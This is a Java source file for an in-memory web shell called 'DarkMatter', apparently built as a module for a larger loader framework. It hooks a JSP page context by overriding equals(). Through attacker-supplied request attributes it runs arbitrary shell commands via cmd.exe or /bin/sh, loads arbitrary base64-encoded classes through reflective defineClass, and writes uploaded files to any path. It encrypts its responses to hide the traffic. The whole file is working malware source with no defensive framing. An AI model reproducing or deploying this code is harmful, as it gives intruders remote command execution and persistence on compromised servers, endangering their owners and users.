import java.io.*;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class DarkMatter extends ClassLoader
{
    public DarkMatter(ClassLoader objParent) { super(objParent); }
    public DarkMatter() { super(DarkMatter.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;
        
        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szAction = mapParams.get("action");

            if (szAction == null)
                return true;

            if (szAction.equalsIgnoreCase("CMD"))
            {
                String szCmd = mapParams.get("cmd");
                if (szCmd == null)
                    return true;

                Process procSystem;
                String szOsName = System.getProperty("os.name").toLowerCase();
                if (szOsName.contains("win"))
                    procSystem = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", szCmd});
                else
                    procSystem = Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", szCmd});

                InputStream isStdout = procSystem.getInputStream();
                InputStream isStderr = procSystem.getErrorStream();
                ByteArrayOutputStream bosBuffer = new ByteArrayOutputStream();

                byte[] abChunk = new byte[1024];
                int nReadLen = 0;

                while ((nReadLen = isStdout.read(abChunk)) != -1)
                    bosBuffer.write(abChunk, 0, nReadLen);

                while ((nReadLen = isStderr.read(abChunk)) != -1)
                    bosBuffer.write(abChunk, 0, nReadLen);
                
                byte[] abResult = bosBuffer.toByteArray();
                fnWriteOutput(objParam, objResponse, osClient, abResult);

                return true;
            }
            else if (szAction.equalsIgnoreCase("LOAD"))
            {
                String szBuffer = mapParams.get("buffer");
                byte[] abClassBytes = Base64.getDecoder().decode(szBuffer);

                Class<?> clazz = null;
                Object objInstance = null;

                Method fnSetAttribute = objRequest.getClass().getMethod("setAttribute", new Class[]{String.class, Object.class});
                ClassLoader objLoader = new java.net.URLClassLoader(new java.net.URL[0], this);
                java.lang.reflect.Method fnDefineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                fnDefineMethod.setAccessible(true);
                clazz = (Class<?>)fnDefineMethod.invoke(objLoader, abClassBytes, 0, abClassBytes.length);
                objInstance = clazz.newInstance();

                Method fnEqualsMethod = clazz.getMethod("equals", Object.class);
                fnSetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance", this});
                fnEqualsMethod.invoke(objInstance, objParam);

                objLoader = null;
                clazz = null;
                objInstance = null;
            }
            else if (szAction.equalsIgnoreCase("UPLOAD"))
            {
                String szPath = mapParams.get("path");
                String szBuffer = mapParams.get("buffer");

                if (szPath == null || szBuffer == null)
                    return true;

                byte[] abBuffer = Base64.getDecoder().decode(szBuffer);
                
                File file = new File(szPath);
                File parent = file.getParentFile();
                if (parent != null)
                    parent.mkdirs();

                FileOutputStream fos = new FileOutputStream(file, true); // append
                fos.write(abBuffer);
                fos.flush();
                fos.close();

                String szResult = Integer.toString(abBuffer.length);
                byte[] abEncryptedResult = Encrypt(objParam, szResult.getBytes("UTF-8"));
                
                osClient.write(abEncryptedResult);
                osClient.flush();

                try
                {
                    
                }
                catch (Exception ex)
                {

                }
            }
            else
            {
                osClient.write(("DARKMATTER_ERROR: Unknown action: " + szAction).getBytes());
            }
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }
}